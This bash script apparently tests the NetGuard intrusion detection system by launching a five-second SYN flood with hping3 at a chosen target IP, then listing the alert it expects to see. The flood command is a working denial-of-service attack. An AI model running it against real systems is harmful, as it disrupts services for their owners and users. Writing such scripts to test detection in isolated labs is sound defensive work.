#!/usr/bin/env bash
# syn_flood.sh — SYN Flood attack test script for NetGuard IDPS demonstration
#
# Prerequisites: hping3
#   Install: sudo apt-get install hping3
#
# Usage:
#   TARGET_IP=<victim-ip> bash syn_flood.sh
#   Example: TARGET_IP=192.168.1.100 bash syn_flood.sh
#
# Expected detection in NetGuard:
#   Attack type : SYN Flood
#   Rule        : SYN_FLOOD_001
#   Severity    : High or Critical (≥ 150 SYN/s → count exceeds 200 in 3 s window)
#   Confidence  : 100
#   Appears on dashboard within ~5 seconds of script start
#
# Safe-use warning:
#   Run ONLY in an isolated lab/hackathon network.
#   SYN floods consume target CPU and bandwidth. Never run against production systems.
#   Script auto-stops after 5 seconds via timeout(1).

TARGET_IP="${TARGET_IP:-}"

if [ -z "$TARGET_IP" ]; then
    echo "ERROR: TARGET_IP is not set." >&2
    echo "Usage: TARGET_IP=<victim-ip> bash $0" >&2
    exit 1
fi

echo "[*] Starting SYN flood → $TARGET_IP (port 80) for 5 seconds..."
timeout 5 hping3 -S -p 80 --flood "$TARGET_IP"
echo "[*] Done. Check NetGuard dashboard for SYN Flood alert."
